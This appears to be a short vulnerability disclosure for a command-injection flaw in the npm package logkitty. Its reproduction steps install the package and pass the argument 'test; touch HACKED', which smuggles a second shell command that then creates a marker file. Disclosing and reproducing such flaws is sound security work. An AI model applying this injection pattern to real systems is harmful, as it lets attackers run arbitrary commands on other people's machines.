# Overview

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

1. Check there aren't files called `HACKED`
2. Execute the following commands in another terminal:

```bash

npm i logkitty # Install affected module

logkitty android app 'test; touch HACKED' #  Note the *touch command* is inside the *'* (single quote), so it's an argument, while it will be executed anyway

```

3. Recheck the files: now `HACKED` has been created
